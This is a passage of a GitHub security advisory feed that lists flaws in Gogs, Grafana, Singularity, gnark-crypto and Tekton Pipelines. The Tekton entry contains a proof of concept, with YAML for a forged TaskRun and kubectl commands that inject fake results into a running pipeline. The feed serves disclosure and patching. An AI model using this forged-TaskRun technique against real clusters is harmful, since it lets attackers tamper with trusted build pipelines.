<li><a href="https://github.com/go-gitea/gitea/commit/599ff1c054e436daa4dc3f049aa8661d9c2395f9">https://github.com/go-gitea/gitea/commit/599ff1c054e436daa4dc3f049aa8661d9c2395f9</a></li>
<li><a href="https://github.com/gogs/gogs/commit/22717a1c064511cf37c46af5e650baf7184cf25b">https://github.com/gogs/gogs/commit/22717a1c064511cf37c46af5e650baf7184cf25b</a></li>
<li><a href="https://github.com/advisories/GHSA-fg3x-rwq9-74cw">https://github.com/advisories/GHSA-fg3x-rwq9-74cw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fg3x-rwq9-74cw</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-05-14T02:20:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[gogs.io/gogs] Gogs XSS Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-px5r-fqj6-r2f8</id>
        <link href="https://github.com/advisories/GHSA-px5r-fqj6-r2f8"/>
        <updated>2023-10-06T16:24:06.000Z</updated>
        <content type="html"><![CDATA[<p>In Gogs 0.11.53, an attacker can use a crafted .eml file to trigger MIME type sniffing, which leads to XSS, as demonstrated by Internet Explorer, because an "X-Content-Type-Options: nosniff" header is not sent.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2018-17031">https://nvd.nist.gov/vuln/detail/CVE-2018-17031</a></li>
<li><a href="https://github.com/gogs/gogs/issues/5397">https://github.com/gogs/gogs/issues/5397</a></li>
<li><a href="https://github.com/gogs/gogs/pull/6008">https://github.com/gogs/gogs/pull/6008</a></li>
<li><a href="https://github.com/gogs/gogs/commit/e14b6abf9dae13bc087c9d9db8fe7c7a5125c792">https://github.com/gogs/gogs/commit/e14b6abf9dae13bc087c9d9db8fe7c7a5125c792</a></li>
<li><a href="https://github.com/advisories/GHSA-px5r-fqj6-r2f8">https://github.com/advisories/GHSA-px5r-fqj6-r2f8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-px5r-fqj6-r2f8</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-14T02:01:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/grafana/grafana] Grafana XSS Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-x5fh-fvvr-892f</id>
        <link href="https://github.com/advisories/GHSA-x5fh-fvvr-892f"/>
        <updated>2023-10-06T15:53:47.000Z</updated>
        <content type="html"><![CDATA[<p>Grafana version confirmed for 5.2.4 and 5.3.0 contains a Cross Site Scripting (XSS) vulnerability in Influxdb and Graphite query editor that can result in Running arbitrary js code in victims browser.. This attack appear to be exploitable via Authenticated user must click on the input field where the payload was previously inserted..</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2018-1000816">https://nvd.nist.gov/vuln/detail/CVE-2018-1000816</a></li>
<li><a href="https://github.com/grafana/grafana/issues/13667">https://github.com/grafana/grafana/issues/13667</a></li>
<li><a href="https://github.com/grafana/grafana/pull/13670">https://github.com/grafana/grafana/pull/13670</a></li>
<li><a href="https://github.com/grafana/grafana/commit/eabb04cec21dc323347da1aab7fcbf2a6e9dd121">https://github.com/grafana/grafana/commit/eabb04cec21dc323347da1aab7fcbf2a6e9dd121</a></li>
<li><a href="https://github.com/advisories/GHSA-x5fh-fvvr-892f">https://github.com/advisories/GHSA-x5fh-fvvr-892f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x5fh-fvvr-892f</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-14T01:42:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[gogs.io/gogs] Gogs Directory Traversal]]></title>
        <id>https://github.com/advisories/GHSA-9hxg-w7qf-hh93</id>
        <link href="https://github.com/advisories/GHSA-9hxg-w7qf-hh93"/>
        <updated>2023-10-06T15:41:48.000Z</updated>
        <content type="html"><![CDATA[<p>In pkg/tool/path.go in Gogs before 0.11.82.1218, a directory traversal in the file-upload functionality can allow an attacker to create a file under data/sessions on the server, a similar issue to CVE-2018-18925.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2018-20303">https://nvd.nist.gov/vuln/detail/CVE-2018-20303</a></li>
<li><a href="https://github.com/gogs/gogs/issues/5558">https://github.com/gogs/gogs/issues/5558</a></li>
<li><a href="https://github.com/gogs/gogs/commit/ff93d9dbda5cebe90d86e4b7dfb2c6b8642970ce">https://github.com/gogs/gogs/commit/ff93d9dbda5cebe90d86e4b7dfb2c6b8642970ce</a></li>
<li><a href="https://pentesterlab.com/exercises/cve-2018-18925/">https://pentesterlab.com/exercises/cve-2018-18925/</a></li>
<li><a href="https://github.com/advisories/GHSA-9hxg-w7qf-hh93">https://github.com/advisories/GHSA-9hxg-w7qf-hh93</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9hxg-w7qf-hh93</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-05-14T01:37:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/hpcng/singularity] Singularity Incorrect Access Control ]]></title>
        <id>https://github.com/advisories/GHSA-4x32-h296-rg6j</id>
        <link href="https://github.com/advisories/GHSA-4x32-h296-rg6j"/>
        <updated>2023-10-06T15:25:57.000Z</updated>
        <content type="html"><![CDATA[<p>Singularity 2.3.0 through 2.5.1 is affected by an incorrect access control on systems supporting overlay file system. When using the overlay option, a malicious user may access sensitive information by exploiting a few specific Singularity features.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2018-12021">https://nvd.nist.gov/vuln/detail/CVE-2018-12021</a></li>
<li><a href="https://github.com/singularityware/singularity/releases/tag/2.5.2">https://github.com/singularityware/singularity/releases/tag/2.5.2</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2019/05/16/1">http://www.openwall.com/lists/oss-security/2019/05/16/1</a></li>
<li><a href="https://github.com/advisories/GHSA-4x32-h296-rg6j">https://github.com/advisories/GHSA-4x32-h296-rg6j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4x32-h296-rg6j</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-14T01:01:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[https://github.com/consensys/gnark-crypto] gnark-crypto's exponentiation in the pairing target group GT using GLV can give incorrect results]]></title>
        <id>https://github.com/advisories/GHSA-pffg-92cg-xf5c</id>
        <link href="https://github.com/advisories/GHSA-pffg-92cg-xf5c"/>
        <updated>2023-10-06T06:07:47.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>When the exponent is bigger than <code>r</code>, the group order of the pairing target group <code>GT</code>, the exponentiation à la GLV (<code>ExpGLV</code>) can <em>sometimes</em> give incorrect results compared to normal exponentiation (<code>Exp</code>). </p>
<p>The issue impacts all users using <code>ExpGLV</code> for exponentiations in <code>GT</code>. This does not impact <code>Exp</code> and <code>ExpCyclotomic</code> which are sound. Also note that GLV methods in G1 and G2 are sound and <em>not</em> impacted.</p>
<h3 id="patches">Patches</h3>
<p>Fix has been implemented in pull request <a href="https://github.com/Consensys/gnark-crypto/pull/451">https://github.com/Consensys/gnark-crypto/pull/451</a> and merged in commit <a href="https://github.com/Consensys/gnark-crypto/commit/ec6be1a037f7c496d595c541a8a8d31c47bcfa3d">https://github.com/Consensys/gnark-crypto/commit/ec6be1a037f7c496d595c541a8a8d31c47bcfa3d</a> to master branch.</p>
<p>The fix increased the bounds of the sub-scalars by 1. In fact, since <a href="https://github.com/Consensys/gnark-crypto/pull/213">https://github.com/Consensys/gnark-crypto/pull/213</a>, we use a fast scalar decomposition that tradeoffs divisions (needed in the Babai rounding) by right-shifts. We precompute <code>b=2^m*v/d (m &gt; log2(d))</code> and then at runtime compute <code>scalar*b/2^m</code> (<code>v</code> is a lattice vector and <code>d</code> the lattice determinant). This increases the bounds on sub-scalars by 1 which we check at runtime before increasing the loop size (we don't target constant-timeness). <code>m</code> is chosen to be a machine word twice big than <code>log2(d)</code> so that we rarely need to increase the loop size. Hence why the issue happens only <em>sometimes</em> if we omit to increase the bounds. This bounds increase was implemented in G1 and G2 but forgot in GT.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Updating to <code>v0.12.1+</code>. Alternatively, use <code>Exp</code> or <code>ExpCyclotomic</code> instead. We are not aware of any users using <code>ExpGLV</code> anyway.</p>
<h3 id="references">References</h3>
<ul>
<li>Fix PR: <a href="https://github.com/Consensys/gnark-crypto/pull/451">https://github.com/Consensys/gnark-crypto/pull/451</a> </li>
<li>Fast scalar decomposition PR: <a href="https://github.com/Consensys/gnark-crypto/pull/213">https://github.com/Consensys/gnark-crypto/pull/213</a></li>
<li><a href="https://eprint.iacr.org/2015/565">https://eprint.iacr.org/2015/565</a> Sec.4.2</li>
</ul>
<h3 id="acknowledgement">Acknowledgement</h3>
<p>The vulnerability was reported by <a href="https://github.com/asanso">Antonio Sanso</a> @ <a href="https://crypto.ethereum.org/">EF</a>.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/Consensys/gnark-crypto/security/advisories/GHSA-pffg-92cg-xf5c">https://github.com/Consensys/gnark-crypto/security/advisories/GHSA-pffg-92cg-xf5c</a></li>
<li><a href="https://github.com/Consensys/gnark-crypto/pull/213">https://github.com/Consensys/gnark-crypto/pull/213</a></li>
<li><a href="https://github.com/Consensys/gnark-crypto/pull/451">https://github.com/Consensys/gnark-crypto/pull/451</a></li>
<li><a href="https://github.com/Consensys/gnark-crypto/commit/ec6be1a037f7c496d595c541a8a8d31c47bcfa3d">https://github.com/Consensys/gnark-crypto/commit/ec6be1a037f7c496d595c541a8a8d31c47bcfa3d</a></li>
<li><a href="https://eprint.iacr.org/2015/565">https://eprint.iacr.org/2015/565</a></li>
<li><a href="https://github.com/advisories/GHSA-pffg-92cg-xf5c">https://github.com/advisories/GHSA-pffg-92cg-xf5c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pffg-92cg-xf5c</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2023-10-05T20:57:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/tektoncd/pipeline] Pipelines do not validate child UIDs]]></title>
        <id>https://github.com/advisories/GHSA-w2h3-vvvq-3m53</id>
        <link href="https://github.com/advisories/GHSA-w2h3-vvvq-3m53"/>
        <updated>2023-10-05T20:50:30.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Pipelines do not validate child UIDs, which means that a user that has access to create TaskRuns can create their own Tasks that the Pipelines controller will accept as the child Task.</p>
<p>We should add UID to PipelineRun status and validate that child Run status/results only come from Runs matching the same UID. </p>
<h3 id="details">Details</h3>
<p>While we <a href="https://github.com/tektoncd/pipeline/blob/2d38f5fa840291395178422d34b36b1bc739e2a2/pkg/reconciler/pipelinerun/pipelinerun.go#L1358-L1372">store and validate the PipelineRun's (api version, kind, name, uid) in the child Run's OwnerReference</a>, we only store (api version, kind, name) in the <a href="https://pkg.go.dev/github.com/tektoncd/pipeline/pkg/apis/pipeline/v1beta1#ChildStatusReference">ChildStatusReference</a> .</p>
<p>This means that if a client had access to create TaskRuns on a cluster, they could create a child TaskRun for a pipeline with the same name + owner reference, and the Pipeline controller picks it up as if it was the original TaskRun. This is problematic since it can let users modify the config of Pipelines at runtime, which violates SLSA L2 Service Generated / Non-falsifiable requirements.</p>
<p>I believe this is also true for <a href="https://github.com/tektoncd/pipeline/blob/0b8349b770a76877051c9c790c94bf9ed897c75c/test/pipelinerun_test.go#L992">TaskRuns -&gt; Pods since it looks like we only lookup by name</a>, though I haven't tested this.</p>
<p>If you have update permissions on tekton resources, you could also perform a similar bypass like this (because it's difficult to distinguish this from a Task retry). For now, I think relying on RBAC is fine and treat update as a privileged role (though we should perhaps update docs to stress this). Create is the most problematic for now. SPIFFE/SPIRE might be able to help with ensuring that only the controller can modify state long term (e.g. sign the expected UIDs?)</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-yaml">apiVersion: [tekton.dev/v1beta1](http://tekton.dev/v1beta1)
kind: PipelineRun
metadata:
  name: hello-pr
spec:
  pipelineSpec:
    tasks:
      - name: task1
        taskSpec:
          steps:
            - name: echo
              image: [distroless.dev/alpine-base](http://distroless.dev/alpine-base)
              script: |
                sleep 60
      - name: task2
        runAfter: [task1]
        taskSpec:
          steps:
            - name: echo
              image: [distroless.dev/alpine-base](http://distroless.dev/alpine-base)
              script: |
                echo "asdf" &gt; $(results.foo.path)
          results:
            - name: foo
    results:
      - name: foo
        value: $(tasks.task2.results.foo)
</code></pre>
<p>Once this is running, grab the PR UID:</p>
<pre><code class="language-sh">$ k get pr hello-pr -o json | jq .metadata.uid -r
</code></pre>
<p>While pipeline is running task 1, start fake task 2:</p>
<pre><code class="language-yaml">apiVersion: [tekton.dev/v1beta1](http://tekton.dev/v1beta1)
kind: TaskRun
metadata:
  annotations:
  labels:
    [app.kubernetes.io/managed-by](http://app.kubernetes.io/managed-by): tekton-pipelines
    [tekton.dev/memberOf](http://tekton.dev/memberOf): tasks
    [tekton.dev/pipeline](http://tekton.dev/pipeline): hello-pr
    [tekton.dev/pipelineRun](http://tekton.dev/pipelineRun): hello-pr
    [tekton.dev/pipelineTask](http://tekton.dev/pipelineTask): task2
  name: hello-pr-task2
  namespace: default
  ownerReferences:
  - apiVersion: [tekton.dev/v1beta1](http://tekton.dev/v1beta1)
    blockOwnerDeletion: true
    controller: true
    kind: PipelineRun
    name: hello-pr
    uid: af549647-4532-468b-90c5-29122a408f8d &lt;--- this should be UID of PR fetched in last step
spec:
  serviceAccountName: default
  taskSpec:
    results:
    - name: foo
      type: string
    steps:
    - image: [distroless.dev/alpine-base](http://distroless.dev/alpine-base)
      name: echo
      resources: {}
      script: |
        echo "zxcv" &gt; $(results.foo.path)
</code></pre>
<p>Get pipeline results - it shows the output of the 2nd injected TaskRun</p>
<pre><code>$ k get pr -o json hello-pr | jq .status.pipelineResults
[
  {
    "name": "foo",
    "value": "zxcv\n"
  }
]
</code></pre>
<h3 id="impact">Impact</h3>
<p>This can be used to trick the Pipeline controller into associating unrelated Runs to the Pipeline, feeding its data through the rest of the Pipeline. This requires access to create TaskRuns, so impact may vary depending on your Tekton setup. <strong>If users already have unrestricted access to create any Task/PipelineRun, this does not grant any additional capabilities</strong>.</p>
<p>Worst case example would be a supply chain attack where a malicious TaskRun triggered from Triggers/Workflows intercepts and replaces a task in a trusted Pipeline.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tektoncd/pipeline/security/advisories/GHSA-w2h3-vvvq-3m53">https://github.com/tektoncd/pipeline/security/advisories/GHSA-w2h3-vvvq-3m53</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-37264">https://nvd.nist.gov/vuln/detail/CVE-2023-37264</a></li>
<li><a href="https://github.com/tektoncd/pipeline/blob/2d38f5fa840291395178422d34b36b1bc739e2a2/pkg/reconciler/pipelinerun/pipelinerun.go#L1358-L1372">https://github.com/tektoncd/pipeline/blob/2d38f5fa840291395178422d34b36b1bc739e2a2/pkg/reconciler/pipelinerun/pipelinerun.go#L1358-L1372</a></li>
<li><a href="https://pkg.go.dev/github.com/tektoncd/pipeline/pkg/apis/pipeline/v1beta1#ChildStatusReference">https://pkg.go.dev/github.com/tektoncd/pipeline/pkg/apis/pipeline/v1beta1#ChildStatusReference</a></li>
<li><a href="https://github.com/advisories/GHSA-w2h3-vvvq-3m53">https://github.com/advisories/GHSA-w2h3-vvvq-3m53</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w2h3-vvvq-3m53</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2023-07-07T18:46:19.000Z</published>
    </entry>
</feed>